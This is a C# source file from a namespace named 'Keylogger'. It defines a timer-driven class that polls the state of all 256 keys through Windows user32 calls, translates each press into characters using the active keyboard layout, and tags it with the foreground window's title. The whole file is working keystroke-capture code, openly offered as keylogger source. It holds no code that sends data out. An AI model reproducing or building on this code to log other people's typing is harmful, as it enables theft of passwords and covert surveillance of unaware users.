using System;
using System.Timers;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Catcher
    {
        [DllImport("user32.dll")]
        static extern int GetAsyncKeyState(int key);

        [DllImport("user32.dll")]
        static extern int GetKeyState(int key);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint virtualKeyCode,
            uint scanCode,
            byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
            StringBuilder receivingBuffer,
            int bufferSize,
            uint flags,
            IntPtr layout);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(int thread);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr proccess);

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        System.Timers.Timer timer;
        int delay;
        public int Delay { get => delay; set => ChangeDelay(value); }
        public bool IsActive { get => timer.Enabled; }

        public delegate void KeyHandler(CatcherEventArgs args);
        public event KeyHandler KeyDown;
        public event KeyHandler KeyUp;
        
        Dictionary<Keys, bool> prevStatus;
        
        public Catcher(int delay)
        {
            prevStatus = new Dictionary<Keys, bool>();
            for (int i = 0; i < 256; i++)
            {
                prevStatus.Add((Keys)i, false);
            }
            timer = new System.Timers.Timer(delay);
            Delay = delay;
            timer.Elapsed += CheckKeys;
        }
        
        public void Start()
        {
            timer.Start();
        }
        
        public void Stop()
        {
            timer.Stop();
        }
        
        void ChangeDelay(int delay)
        {
            this.delay = delay;
            timer.Interval = delay;
        }
        
        public void CheckKeys(Object source, ElapsedEventArgs e)
        {
            IntPtr foregroundWindow = GetForegroundWindow();
            bool shift = GetAsyncKeyState((int)Keys.ShiftKey) != 0;
            bool alt = GetAsyncKeyState((int)Keys.Menu) != 0;
            bool control = GetAsyncKeyState((int)Keys.ControlKey) != 0;
            bool caps = GetKeyState((int)Keys.CapsLock) == 1;
            for (int i = 0; i < 256; i++)
            {
                int responce = GetAsyncKeyState(i);
                Keys key = (Keys)i;
                CatcherEventArgs args = null;
                if(responce == 32769 || (responce == 0 && prevStatus[key]))
                {
                    args = GetArgs(key, KeyToString(i, shift || caps, foregroundWindow), foregroundWindow);
                    args.Alt = alt;
                    args.Control = control;
                    args.Shift = shift;
                }
                if (responce == 32769)
                {
                    prevStatus[key] = true;
                    KeyDown(args);
                }
                else if(responce == 0 && prevStatus[key])
                {
                    prevStatus[key] = false;
                    KeyUp(args);
                }
            }
        }

        CatcherEventArgs GetArgs(Keys key, string unicode, IntPtr window)
        {
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(window, sb, sb.Capacity);
            return new CatcherEventArgs(key, unicode, sb.ToString());
        }
        string KeyToString(int key, bool shift,  IntPtr window)
        {
            int foregroundWindow = (int)GetWindowThreadProcessId(window, IntPtr.Zero);
            StringBuilder sb = new StringBuilder(256);
            byte[] state = new byte[256];
            if (shift)
                state[(int)Keys.ShiftKey] = 255;
            ToUnicodeEx((uint)key, 0, state, sb, 256, 0, GetKeyboardLayout(foregroundWindow));
            return sb.ToString();
        }
    }
}
